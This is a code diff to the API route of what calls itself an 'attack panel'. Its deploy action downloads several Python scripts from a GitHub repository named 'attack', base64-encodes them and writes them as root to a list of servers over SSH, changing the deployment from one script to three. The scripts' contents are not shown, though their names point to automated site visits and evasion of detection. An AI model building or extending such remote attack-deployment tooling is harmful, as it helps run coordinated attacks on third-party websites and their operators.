@@ -111,22 +111,33 @@ export async function POST(req) {
       return NextResponse.json({ results });
 
     } else if (action === 'deploy') {
-      let scriptB64;
-      try {
-        const ghResp = await fetch('https://raw.githubusercontent.com/fanarali881-eng/attack/main/visit.py', {
-          headers: { 'User-Agent': 'attack-panel' }
-        });
-        if (!ghResp.ok) throw new Error(`GitHub returned ${ghResp.status}`);
-        const scriptContent = await ghResp.text();
-        scriptB64 = Buffer.from(scriptContent).toString('base64');
-      } catch(e) {
-        return NextResponse.json({ error: 'Could not fetch visit.py from GitHub: ' + e.message }, { status: 500 });
+      // Fetch all 3 script files from GitHub
+      const files = [
+        { name: 'visit.py', path: '/root/visit.py' },
+        { name: 'browser_engine.py', path: '/root/browser_engine.py' },
+        { name: 'detection_engine.py', path: '/root/detection_engine.py' },
+      ];
+      
+      const fileData = {};
+      for (const file of files) {
+        try {
+          const ghResp = await fetch(`https://raw.githubusercontent.com/fanarali881-eng/attack/main/${file.name}`, {
+            headers: { 'User-Agent': 'attack-panel' }
+          });
+          if (!ghResp.ok) throw new Error(`GitHub returned ${ghResp.status}`);
+          const content = await ghResp.text();
+          fileData[file.name] = Buffer.from(content).toString('base64');
+        } catch(e) {
+          return NextResponse.json({ error: `Could not fetch ${file.name} from GitHub: ${e.message}` }, { status: 500 });
+        }
       }
       
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const deployCmd = `echo "${scriptB64}" | base64 -d > /root/visit.py && wc -c /root/visit.py && echo "Script v12 deployed"`;
-          const r = await runSSHCommand(server, deployCmd, 15000);
+          const deployCmd = files.map(f => 
+            `echo "${fileData[f.name]}" | base64 -d > ${f.path}`
+          ).join(' && ') + ' && wc -c /root/visit.py /root/browser_engine.py /root/detection_engine.py && echo "Script v13 deployed (3 files)"';
+          const r = await runSSHCommand(server, deployCmd, 20000);
           return { host: server.host, ...r };
         })
       );
